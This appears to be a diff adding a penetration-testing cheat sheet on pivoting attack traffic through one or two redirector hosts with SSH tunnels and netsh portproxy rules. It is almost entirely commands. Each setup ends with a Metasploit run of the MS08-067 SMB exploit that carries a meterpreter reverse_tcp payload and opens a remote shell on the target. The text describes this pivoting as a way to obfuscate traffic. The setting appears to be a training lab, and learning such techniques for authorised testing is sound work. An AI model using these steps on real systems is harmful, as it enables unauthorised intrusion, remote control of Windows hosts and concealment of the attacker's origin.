@@ -1,0 +1,104 @@
+Below are examples of ssh tunneling to obfuscate traffic while pen-testing a given environment. For simplicities sake, I've included the age old ms08_067_netapi example because it almost always works. 
+
+
+
+Estb. redirector - 1 hop thru Linux box - Estb. port proxy from Kali machine to end target
+
+
+NOTE: *For the return path - ALL RETURN PORTS MUST BE THE SAME
+
+ON KALI VM - Terminal #1
+root@kali > ssh student@10.0.0.130 -L 5445:X.X.X.X:445 -R 8080:0.0.0.0:8080
+
+ON KALI VM - Terminal #2 
+anybody@kali > msfconsole
+msf > use exploit/windows/smb/ms08_067_netapi
+msf(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp
+msf(ms08_067_netapi) > set RHOST 127.0.0.1
+msf(ms08_067_netapi) > set RPORT 5445
+msf(ms08_067_netapi) > set LHOST 10.0.0.130 (closest box to TGT)
+msf(ms08_067_netapi) > set LPORT 8080
+msf(ms08_067_netapi) > set TARGET 4 (if XP SP2)
+msf(ms08_067_netapi) > show options
+msf(ms08_067_netapi) > exploit
+
+After exploiting, ensure you made it to the correct IP address
+meterpreter > ifconfig     (****should see IP =X.X.X.X)
+meterpreter > netstat -ano (verify your connections)
+meterpreter > shell-------->>>>>>  C:\Windows\System32>
+
+
+
+
+
+Estb. redirector - 1 hop thru Windows box - Estb. proxy from Kali machine to end target
+
+
+NOTE: *For the return path - ALL RETURN PORTS MUST BE THE SAME
+
+ON Windows 7 VM - Terminal #1
+C:\ > netsh interface portproxy show all
+C:\ > netsh interface portproxy reset all (if needed)
+
+C:\ > netsh interface portproxy add v4tov4 listenport=5445 listenaddress=0.0.0.0 connectport=445 connectaddress=X.X.X.X
+
+C:\ > netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8080 connectaddress=10.0.0.110
+
+C:\ > netsh interface portproxy show all (verify your connections took correctly)
+
+ON KALI VM - Terminal #2
+anybody@kali > msfconsole
+msf > use exploit/windows/smb/ms08_067_netapi
+msf(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp
+msf(ms08_067_netapi) > set RHOST 10.0.0.50
+msf(ms08_067_netapi) > set RPORT 5445
+msf(ms08_067_netapi) > set LHOST 10.0.0.50 (closest box to TGT)
+msf(ms08_067_netapi) > set LPORT 8080
+msf(ms08_067_netapi) > set TARGET 4 (if XP SP2)
+msf(ms08_067_netapi) > show options
+msf(ms08_067_netapi) > exploit
+
+After exploiting, ensure you made it to the correct IP address
+meterpreter > ifconfig     (****should see IP =X.X.X.X)
+meterpreter > netstat -ano (verify your connections)
+meterpreter > shell -------->>>>>>  C:\Windows\System32>
+
+
+
+
+
+Estb. redirector - 2 hops
+
+NOTE: *For the return path - ALL RETURN PORTS MUST BE THE SAME
+
+ON KALI VM - Terminal #1
+root@kali > ssh student@10.0.0.130 -L 5445:10.0.0.50:9050 -R 9051:0.0.0.0:9051
+
+ON Windows 7 VM - Terminal #1
+*To reset Netsh connections
+C:\ > netsh interface portproxy show all
+C:\ > netsh interface portproxy reset all (if needed)
+
+NOTE: Listen address is always 0.0.0.0
+C:\ > netsh interface portproxy add v4tov4 listenport=9050 listenaddress=0.0.0.0 connectport=445 connectaddress=X.X.X.X
+
+C:\ > netsh interface portproxy add v4tov4 listenport=9051 listenaddress=0.0.0.0 connectport=9051 connectaddress=10.0.0.130
+
+C:\ > netsh interface portproxy show all (verify your connections took correctly)
+
+ON KALI VM - Terminal #2
+anybody@kali > msfconsole
+msf > use exploit/windows/smb/ms08_067_netapi
+msf(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp
+msf(ms08_067_netapi) > set RHOST 127.0.0.1
+msf(ms08_067_netapi) > set RPORT 5445
+msf(ms08_067_netapi) > set LHOST 10.0.0.50 (closest box to TGT)
+msf(ms08_067_netapi) > set LPORT 9051
+msf(ms08_067_netapi) > set TARGET 4 (if XP SP2)
+msf(ms08_067_netapi) > show options
+msf(ms08_067_netapi) > exploit
+
+After exploiting, ensure you made it to the correct IP address
+meterpreter > ifconfig  (should see IP =X.X.X.X)
+meterpreter > netstat -ano (verify your connections)
+meterpreter > shell -------->>>>>>  C:\Windows\System32>
